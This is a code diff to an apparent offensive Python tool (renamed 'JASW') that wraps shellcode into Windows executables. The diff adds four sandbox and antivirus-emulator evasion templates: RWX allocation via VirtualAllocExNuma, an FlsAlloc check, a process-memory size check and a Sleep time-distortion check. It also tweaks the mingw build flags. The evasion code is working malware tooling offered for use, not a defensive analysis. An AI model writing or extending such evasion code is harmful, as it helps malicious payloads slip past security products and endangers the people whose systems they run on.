@@ -12,23 +12,14 @@ from termcolor import cprint, colored
 
 def intro():
     from art import text2art
-    print(text2art("shellcoder", "graffiti"))
-    print((emoji.emojize(":zany_face:") * 36))
-    print(emoji.emojize(":zany_face:") + " " * 68 + emoji.emojize(":zany_face:"))
-    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
-        ":thumbs_up:") + " Many thanks to https://github.com/EnginDemirbilek/Flip" + " " * 10 + emoji.emojize(
-        ":zany_face:"))
-    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
-        ":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte" + " " * 10 + emoji.emojize(
-        ":zany_face:"))
-    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
-        ":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper" + " " * 5 + emoji.emojize(
-        ":zany_face:"))
-    print(emoji.emojize(":zany_face:") + " " + emoji.emojize(":right_arrow:") + " " + emoji.emojize(
-        ":thumbs_up:") + " All the guys everywhere" + " " * 37 + emoji.emojize(":zany_face:"))
-    print(emoji.emojize(":zany_face:") + " " * 68 + emoji.emojize(":zany_face:"))
-    print((emoji.emojize(":zany_face:") * 36))
-
+    print(text2art("JASW", "graffiti"))
+    print()
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " Many thanks to https://github.com/EnginDemirbilek/Flip")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " All the guys everywhere")
+    print()
+    print(text2art("JASW", "efti_wall"))
 
 class Bypass:
     func_name = None
@@ -235,6 +226,135 @@ int {0}() {{
         )
 
 
+class NonEmulatedAPINuma(Bypass):
+    def __init__(self):
+        super().__init__()
+
+    @staticmethod
+    def menu():
+        return "Non emulated API (VirtualAllocExNuma)"
+
+    def get_template(self):
+        return '''
+        
+int {0}() {{
+    LPVOID {1} = NULL;
+    {1} = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE,0);
+  
+    if ({1} == NULL)
+    {{
+      return 0;
+    }}
+    
+    return 1;
+}}
+        '''.format(
+            self.func_name,
+            ShellCoder.make_random_str(),
+        )
+
+
+class FiberLocalStorage(Bypass):
+    def __init__(self):
+        super().__init__()
+
+    @staticmethod
+    def menu():
+        return "Fiber Local Storage"
+
+    def get_template(self):
+        return '''
+        
+int {0}() {{
+    DWORD {1} = FlsAlloc(NULL);
+  
+    if ({1} == FLS_OUT_OF_INDEXES)
+    {{
+      return 0;
+    }}
+    
+    return 1;
+}}
+        '''.format(
+            self.func_name,
+            ShellCoder.make_random_str(),
+        )
+
+
+class CheckProcessMemory(Bypass):
+    def __init__(self):
+        super().__init__()
+
+    @staticmethod
+    def menu():
+        return "Check process memory"
+
+    def additional_import(self):
+        return """#include <psapi.h>
+#pragma comment(lib, "psapi.lib")
+        """
+
+    def get_template(self):
+        return '''
+        
+int {0}() {{
+    PROCESS_MEMORY_COUNTERS {1};
+    GetProcessMemoryInfo(GetCurrentProcess(), &{1}, sizeof({1}));
+
+    if({1}.WorkingSetSize<=3500000)
+    {{
+        return 1;
+    }}
+  
+    return 0;
+}}
+        '''.format(
+            self.func_name,
+            ShellCoder.make_random_str(),
+        )
+
+
+class TimeDistortionSleep(Bypass):
+    def __init__(self):
+        super().__init__()
+
+    @staticmethod
+    def menu():
+        return "Time distortion (Sleep)"
+
+    def additional_flags(self):
+        return ['-lwinmm']
+
+    def additional_import(self):
+        return """#include <time.h>
+#pragma comment (lib, "winmm.lib")
+        """
+
+    def get_template(self):
+        return '''
+        
+int {0}() {{
+    DWORD {1};
+    DWORD {2};
+    
+    {1} = timeGetTime();
+    Sleep(10000);
+    {2} = timeGetTime();
+    
+    if({2} > ({1} + 9990))
+    {{
+        return 1;
+    }}
+    
+    return 0;
+}}
+        '''.format(
+            self.func_name,
+            ShellCoder.make_random_str(),
+            ShellCoder.make_random_str(),
+        )
+
+
 class ShellCoder:
     arch_output = None
     arch_payload = None
@@ -385,6 +505,10 @@ class Windows(ShellCoder):
         HundredMillionIncrements,
         AttemptToOpenASystemProcess,
         AttemptToOpenANonExistingURL,
+        NonEmulatedAPINuma,
+        FiberLocalStorage,
+        CheckProcessMemory,
+        TimeDistortionSleep,
     ]
 
     def __init__(self):
@@ -597,6 +721,7 @@ if ({bypass_calls}) {{
             command = 'x86_64-w64-mingw32-g++ %s -o %s/shellcoder.exe' % (self.template_path, self.output_path)
 
         command += ' -s ' \
+                   ' -w ' \
                    '-fomit-frame-pointer ' \
                    '-fno-unwind-tables  ' \
                    '-ffunction-sections ' \
